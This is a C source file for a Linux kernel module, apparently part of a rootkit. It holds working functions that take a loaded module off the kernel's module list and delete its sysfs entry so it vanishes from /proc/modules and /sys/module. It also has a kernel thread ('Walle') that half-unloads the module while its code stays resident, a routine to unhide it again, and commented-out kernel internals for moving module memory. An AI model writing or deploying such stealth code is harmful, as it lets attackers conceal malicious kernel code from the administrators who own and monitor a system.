#include "hide_module.h"
bool hidden = false;
LIST_HEAD(hidden_modules);
struct list_head *modules;
struct kobj_type *ktype;

void hide_this_module(void) {
	struct module* mod;
	mod = &__this_module;
	hide_module(mod);
}

void hide_module(struct module* mod) {

	modules = mod->list.prev;
	// remove from /proc/modules
	list_del(&mod->list);
	// remove from /sys/modules
	kobject_del(&mod->mkobj.kobj);

	//mod->sect_atts = NULL;
	//mod->notes_atts = NULL;
	
	list_add(&mod->list, &hidden_modules);
	hidden = true;
	
//	newmod = move_module_somewhere_else(mod);
	DEBUGMSG("shuld be unloaded but still running \n");
}


/* Free a module, remove from lists, etc. */
static void free_module(struct module *mod)
{
	//trace_module_free(mod);

	//mod_sysfs_teardown(mod);

	/* We leave it in list to prevent duplicate loads, but make sure
	 * that noone uses it while it's being deconstructed. */
	mutex_lock(&module_mutex);
	mod->state = MODULE_STATE_UNFORMED;
	mutex_unlock(&module_mutex);

	/* Remove dynamic debug info */
	ddebug_remove_module(mod->name);

	/* Arch-specific cleanup. */
	//module_arch_cleanup(mod);

	/* Module unload stuff */
	//module_unload_free(mod);

	/* Free any allocated parameters. */
	//destroy_params(mod->kp, mod->num_kp);

	/* Now we can delete it from the lists */
	mutex_lock(&module_mutex);
	/* Unlink carefully: kallsyms could be walking list. */
	list_del_rcu(&mod->list);
	//mod_tree_remove(mod);
	/* Remove this module from bug list, this uses list_del_rcu */
	//module_bug_cleanup(mod);
	/* Wait for RCU-sched synchronizing before releasing mod->list and buglist. */
	synchronize_sched();
	mutex_unlock(&module_mutex);

	/* This may be NULL, but that's OK */
	//unset_module_init_ro_nx(mod);
	//module_arch_freeing_init(mod);
	//module_memfree(mod->module_init);
	kfree(mod->args);
	//percpu_modfree(mod);

	/* Free lock-classes; relies on the preceding sync_rcu(). */
	lockdep_free_key_range(mod->module_core, mod->core_size);

	/* Finally, free the core (containing the module structure) */
	//unset_module_core_ro_nx(mod);
	//module_memfree(mod->module_core);

#ifdef CONFIG_MPU
	update_protections(current->mm);
#endif
}

int unload_thread(void *vmod) {

	struct module* mod = (struct module*) vmod;
	mod->exit();
	//blocking_notifier_call_chain(&module_notify_list,
	//		MODULE_STATE_GOING, mod);
	async_synchronize_full();

	/* Store the name of the last unloaded module for diagnostic purposes */
	//strlcpy(last_unloaded_module, mod->name, sizeof(last_unloaded_module));

	free_module(mod);
	DEBUGMSG("Walle done...\n");
	do_exit(0);
}
void unload(void) {
	// Start Walle, the Thread to clean up my mess
	kthread_run(&unload_thread,(void *) &__this_module, "Walle");
}

void show_module(void) {

	struct module *mod;
	int ret;
	mod = &__this_module; //find_module("hide_module");
	DEBUGMSG("this method would normally show the module\n");
	list_add(&mod->list, modules);
	//kobjct_add(&mod->mkobj.kobj);
	//mod->mkobj.kobj = *kobject_create_and_add(mod
	ret = kobject_add(&mod->mkobj.kobj, NULL, "%s", mod->name);
	mod->holders_dir = kobject_create_and_add("holders", &mod->mkobj.kobj);
	hidden = false;
}


/*

struct module* move_module_somewhere_else(struct module* mod){
	//struct module* newmod;
	int i;
	void* ptr;

	//newmod = kmalloc(mod->core_size);	// kernel uses vmalloc_exec(size) in move_module
	ptr = vmalloc_exec(mod->core_size);
	kmemleak_not_leak(ptr);
	memset(ptr, 0, mod->core_size);
	mod->module_core = ptr;

*/



/*
	if (mod->init_size) {
		ptr = module_alloc(mod->init_size);
		 // The pointer to this block is stored in the module structure
		 // which is inside the block. This block doesn't need to be
		 // scanned as it contains data and code that will be freed
		 // after the module is initialized.
		kmemleak_ignore(ptr);
		if (!ptr) {
			module_memfree(mod->module_core);
			return -ENOMEM;
		}
		memset(ptr, 0, mod->init_size);
		mod->module_init = ptr;
	} else
		mod->module_init = NULL;
*/
/*
	// Transfer each section which specifies SHF_ALLOC	
	pr_debug("final section addresses:\n");
	for (i = 0; i < info->hdr->e_shnum; i++) {
		void *dest;
		Elf_Shdr *shdr = &info->sechdrs[i];

		if (!(shdr->sh_flags & SHF_ALLOC))
			continue;

		if (shdr->sh_entsize & INIT_OFFSET_MASK)
			dest = mod->module_init
				+ (shdr->sh_entsize & ~INIT_OFFSET_MASK);
		else
			dest = mod->module_core + shdr->sh_entsize;

		if (shdr->sh_type != SHT_NOBITS)
			memcpy(dest, (void *)shdr->sh_addr, shdr->sh_size);
		// Update sh_addr to point to copy in image. 
		shdr->sh_addr = (unsigned long)dest;
		pr_debug("\t0x%lx %s\n",
				(long)shdr->sh_addr, info->secstrings + shdr->sh_name);
	}
return mod;
}
*/

/*
void set_page_attributes(void *start, void *end, int (*set)(unsigned long start, int num_pages))
{
	unsigned long begin_pfn = PFN_DOWN((unsigned long)start);
	unsigned long end_pfn = PFN_DOWN((unsigned long)end);

	if (end_pfn > begin_pfn)
		set(begin_pfn << PAGE_SHIFT, end_pfn - begin_pfn);
}

static void unset_module_core_ro_nx(struct module *mod)
{
	set_page_attributes(mod->module_core + mod->core_text_size,
			mod->module_core + mod->core_size,
			SM_set_memory_x);
	set_page_attributes(mod->module_core,
			mod->module_core + mod->core_ro_size,
			SM_set_memory_rw);
}

static void unset_module_init_ro_nx(struct module *mod)
{
	set_page_attributes(mod->module_init + mod->init_text_size,
			mod->module_init + mod->init_size,
			SM_set_memory_x);
	set_page_attributes(mod->module_init,
			mod->module_init + mod->init_ro_size,
			SM_set_memory_rw);
}

static void module_unload_free(struct module *mod)
{
	struct module_use *use, *tmp;

	mutex_lock(&module_mutex);
	list_for_each_entry_safe(use, tmp, &mod->target_list, target_list) {
		struct module *i = use->target;
		pr_debug("%s unusing %s\n", mod->name, i->name);
		module_put(i);
		list_del(&use->source_list);
		list_del(&use->target_list);
		((void (*)(const void*))SM_kfree)(use);
	}
	mutex_unlock(&module_mutex);
}


	
static noinline void __mod_tree_insert(struct mod_tree_node *node)
{
	latch_tree_insert(&node->node, &mod_tree.root, &mod_tree_ops);
}

static void __mod_tree_remove(struct mod_tree_node *node)
{
	latch_tree_erase(&node->node, &mod_tree.root, &mod_tree_ops);
}



static void mod_tree_remove_init(struct module *mod)
{
	if (mod->init_size)
		__mod_tree_remove(&mod->mtn_init);
}

static void mod_tree_remove(struct module *mod)
{
	__mod_tree_remove(&mod->mtn_core);
	mod_tree_remove_init(mod);
}
*/

/*
static void free_module_modifyed(struct module *mod)
{
	//trace_module_free(mod);

	//mod_sysfs_teardown(mod);

//	 We leave it in list to prevent duplicate loads, but make sure
//	 * that noone uses it while it's being deconstructed. 
	mutex_lock(&module_mutex);
	mod->state = MODULE_STATE_UNFORMED;
	mutex_unlock(&module_mutex);

	// Remove dynamic debug info 
	ddebug_remove_module(mod->name);

	// Arch-specific cleanup. 
	module_arch_cleanup(mod);

	// Module unload stuff 
	module_unload_free(mod);

	// Free any allocated parameters. 
	destroy_params(mod->kp, mod->num_kp);

	// Now we can delete it from the lists 
	mutex_lock(&module_mutex);
	// Unlink carefully: kallsyms could be walking list. 
	list_del_rcu(&mod->list);
//	mod_tree_remove(mod);
	// Remove this module from bug list, this uses list_del_rcu 
	module_bug_cleanup(mod);
	// Wait for RCU-sched synchronizing before releasing mod->list and buglist. 
	//synchronize_sched();
	mutex_unlock(&module_mutex);

	// This may be NULL, but that's OK 
	unset_module_init_ro_nx(mod);
	//module_arch_freeing_init(mod);
//	module_memfree(mod->module_init);
//	kfree(mod->args);
//	percpu_modfree(mod);

	// Free lock-classes; relies on the preceding sync_rcu(). 
	lockdep_free_key_range(mod->module_core, mod->core_size);

	// Finally, free the core (containing the module structure) 
	unset_module_core_ro_nx(mod);
	//module_memfree(mod->module_core);

#ifdef CONFIG_MPU
	update_protections(current->mm);
#endif
}
 */
